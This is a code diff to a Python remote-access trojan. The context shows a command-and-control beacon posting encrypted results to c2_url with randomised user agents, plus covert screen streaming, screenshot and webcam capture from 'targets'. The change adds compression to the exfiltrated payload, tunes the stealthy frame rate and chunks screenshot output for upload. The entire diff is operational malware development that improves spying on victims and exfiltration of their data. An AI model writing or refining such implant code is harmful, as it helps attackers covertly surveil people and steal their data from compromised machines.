@@ -10,6 +10,7 @@ import base64
 import random
 import threading
 import subprocess
+import zlib
 import requests
 import wmi
 import winreg
@@ -298,7 +299,18 @@ def main():
             "results": pending_results[:]
         }
         try:
-            enc_payload = encrypt(json.dumps(payload).encode())
+            json_bytes = json.dumps(payload).encode('utf-8')
+            # Compress with maximum compression level
+            compressed = zlib.compress(json_bytes, level=9)
+
+            # Optional: Add a small header to indicate compression (1 byte flag)
+            # 1 = compressed, 0 = uncompressed
+            final_payload = b"\x01" + compressed
+
+            # Fallback: if compressed is larger (rare), send uncompressed
+            if len(compressed) >= len(json_bytes):
+                final_payload = b"\x00" + json_bytes
+            enc_payload = encrypt(final_payload)
             resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)
             if resp.status_code != 200:
                 time.sleep(get_jittered_sleep())
@@ -346,7 +358,7 @@ def screen_stream_worker(duration: int = 0):  # 0 = indefinite
                 pending_results.append(result)
 
             chunk_id += 1
-            time.sleep(0.5)  # ~2 FPS – stealthy bandwidth, stable on low-end targets
+            time.sleep(0.7)  # ~2 FPS – stealthy bandwidth, stable on low-end targets
 
         # Send end marker
         with results_lock:
@@ -533,7 +545,12 @@ def handle_task(task):
     try:
         if ttype == "screenshot":
             data = capture_screenshot()
-            return chunk_large_output("SCREENSHOT:", data)[0]
+            chunks = chunk_large_output("SCREENSHOT:", data)
+            for i, chunk in enumerate(chunks):
+                part_result = {"task_id": tid + (f"_part{i}" if i > 0 else ""), "output": chunk}
+                with results_lock:
+                    pending_results.append(part_result)
+            return  # safe to return after manually appending
         elif ttype == "webcam":
             data = capture_webcam()
             result["output"] = "WEBCAM:" + base64.b64encode(data).decode()
